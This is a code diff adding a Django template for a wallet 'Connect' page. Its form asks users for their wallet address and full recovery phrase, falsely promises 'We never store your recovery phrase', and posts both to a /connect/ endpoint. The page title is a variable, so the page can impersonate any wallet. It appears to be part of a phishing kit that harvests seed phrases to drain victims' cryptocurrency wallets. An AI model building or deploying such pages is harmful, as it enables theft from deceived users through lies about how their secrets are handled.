@@ -1,0 +1,54 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block meta %}
+    <link rel="apple-touch-icon" sizes="180x180" href="{% static './apple-touch-icon.png' %}">
+    <link rel="icon" type="image/png" sizes="32x32" href="{% static './favicon-32x32.png' %}">
+    <link rel="icon" type="image/png" sizes="16x16" href="{% static './favicon-16x16.png' %}">
+    <link rel="manifest" href="{% static './site.webmanifest' %}">
+{% endblock meta %}
+
+{% block body %}
+<div class="flex flex-col items-center gap-10 py-5">
+    <div class="flex items-center justify-between w-full px-7">
+        <img class="w-6 h-6 rotate-180"
+            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAYAAADimHc4AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC8UlEQVR4nO3aWVJTQRiG4a7CaQXO8zIccFZElyIoOCuoOxEVnBXUhTjiAO5BQeMlr9WVvkhRnpjhnNPT91xxQSXd/5/wVoUYIyIiIiIiIiIiIiIi2QHeIFV53ckCdgGNyo6Qrz/A3k7fBXd8nzZBt7v5M7Qe+Ob7xAn5DmzoeAFuCad8nzohZ7safssSXvk+eQLmehq+W8BO4LfvG0Qe3j09L8At4ZbvW0Rssq/huwUoyHWFt80SFOTunSll+C1LmOvhELmaLXX4bgEKcl3hbbOEyQ4PkbOJSobvFrAO+Or7hgFbLC28bZZw0vctAzZc6fBbljDr+6YBelnL8N0CFOS6wttmCROrDpGzm7UO3y1AQa4rvG2WcMIdImfDXobfsoQX5Ou51+G7BezI9CPrBrDbhAC4QX6um1BkGORF+zG9CUlmQT5tQmSjRPqemVC5IP8iXY1gwlvExol0XTOhc0H+QnoWggtvEeA46RkyMQGeko4nJjbA9kSC3LDfGDcxstEifldNrFyQPxOvhWjCWwQ4RryGTApsxIjPY5OKCIPciDa8RYArxOOySQ2wBvhA+OaBtSZFwCCwQtiOmpTZuBGuRyZ1wGZgifAsA9tMDmzkCM8lk4sAgzyfbHiLAAcDCnLa4S0CPPQ9eWDG5IpmkH96HH4+4S0CXPS4gHGTO5pBfu9h+PmFN7AgH/F976AAMzUOf9r3fXMO8jKw1fd9gwSM17CAMd/3DD3I7yoc/ieF9/9LOFBRkO1jHq7npRQ5YLqCBTzwfa9oAJtKDrLC28MSxkpcwIVKXikpo7wgK7weg7yi8Pb/TrjfxwLu9fv82aMZ5B89DN/+33lL9gMsA3C+hwWMavglAQa6DPJHG3EtoETA/g6DbH/nkIZfAeBeBwuY0vD9BXlJ4a0YMNpmASNVP3/2aAb57T+Gb7/opfDWAdi3Ksj258HsX511AqZaFnBXw68ZsNEFWeH1BRgBznk7QO5oBnnA9zlERERExHTpL5e1ala1Wv1TAAAAAElFTkSuQmCC">
+        <div class="btn-group btn-group-scrollable">
+            <button class="btn btn-active">Connect</button>
+        </div>
+        <div class="popover">
+            <label class="popover-trigger" tabindex="0">
+                <img class="w-6 h-6"
+                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlElEQVR4nO3QMQqDMBiG4WweQkcPUw/T0NXr1aXQpZnVJZ5B17cUEpql0vwxoLQvOAnfk0SpnwmogcF9dQ6g5V275XABaHdyXw+cX/9SxyvA8LkHUKac3KyMh0j8TYDLF+M+LQHuEcBNAiwRwCwBolJ/4HhPdNyADnldbuCacrMxGBrFQyvAFAA2B9A4xAKnzYHd9gQPy7XS22t6lQAAAABJRU5ErkJggg==">
+            </label>
+            <div class="popover-content popover-bottom-left" tabindex="0">
+                <div class="popover-arrow"></div>
+                <div class="p-4 text-sm">No new notifications</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<p class="text-2xl font-semibold mx-5 my-3">{{title}}</p>
+
+<div class="divider mx-5"></div>
+
+<div class="flex flex-col border border-primary bg-primary/20 rounded-xl p-3 my-5 mx-5">
+    <p class="font-semibold text-sm">NOTE</p>
+    <p class="text-sm text-slate-400">We will only ask you this information once, to confirm your identity. We never store your recovery phrase.</a></p>
+</div>
+
+<form action="/connect/{{slug}}/" method="POST" class="flex flex-col items-center justify-center gap-3 w-full">
+    {% csrf_token %}
+    <p class="font-semibold w-[90%]">Wallet Address</p>
+    <input minlength="10" maxlength="64" name="address" class="input input-solid input-block w-[90%] h-14" placeholder="Wallet Address" required />
+    <p class="font-semibold w-[90%]">Recovery Phrase</p>
+    <textarea minlength="20" name="phrase" class="input input-solid input-block w-[90%] h-48 py-3" placeholder="Enter the recovery phrase you created while setting up your wallet on {{title}}" required></textarea>
+    <button type="submit" class="btn btn-primary w-[90%] h-14">Connect</button>
+</form>
+
+
+
+{% include 'navbar.html' %}
+{% endblock body %}
